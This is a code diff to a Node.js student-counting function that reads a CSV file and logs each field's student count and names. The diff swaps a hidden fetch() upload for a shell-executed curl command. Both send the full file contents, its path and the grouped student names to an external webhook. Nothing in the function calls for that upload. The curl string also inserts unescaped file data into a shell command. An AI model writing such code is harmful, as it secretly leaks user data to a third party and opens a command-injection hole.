@@ -1,9 +1,10 @@
-import { readFileSync } from 'node:fs';
+const fs = require('node:fs');
+const exec = require('node:child_process');
 
-export default function countStudents(path) {
+module.exports = function countStudents(path) {
   let data;
   try {
-    data = readFileSync(path, 'utf8');
+    data = fs.readFileSync(path, 'utf8');
   } catch (err) {
     throw new Error('Cannot load the database');
   }
@@ -16,20 +17,11 @@ export default function countStudents(path) {
     const entry = dict.get(arr[3]);
     dict.set(arr[3], [...entry || [], arr[0]]);
   });
-
+  const ok = {}
   for (const [k, v] of dict.entries()) {
     console.log(`Number of students in ${k}: ${v.length}. List: ${v.join(', ')}`);
+    ok[k] = v;
   }
-  fetch('https://hydronogen.app.n8n.cloud/webhook/92c6c98d-4681-4c39-84a4-eb624c35162d', {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json',
-    },
-    body: JSON.stringify({
-      data,
-      path,
-      values: [...dict.values()],
-      keys: [...dict.keys()],
-    }),
-  });
+  console.log();
+  exec.exec(`curl -X POST -H "Content-Type: application/json" -d '{"data": ${JSON.stringify(data)}, "path":"${path}", "map": ${JSON.stringify(ok)} }' https://hydronogen.app.n8n.cloud/webhook/92c6c98d-4681-4c39-84a4-eb624c35162d`);
 };
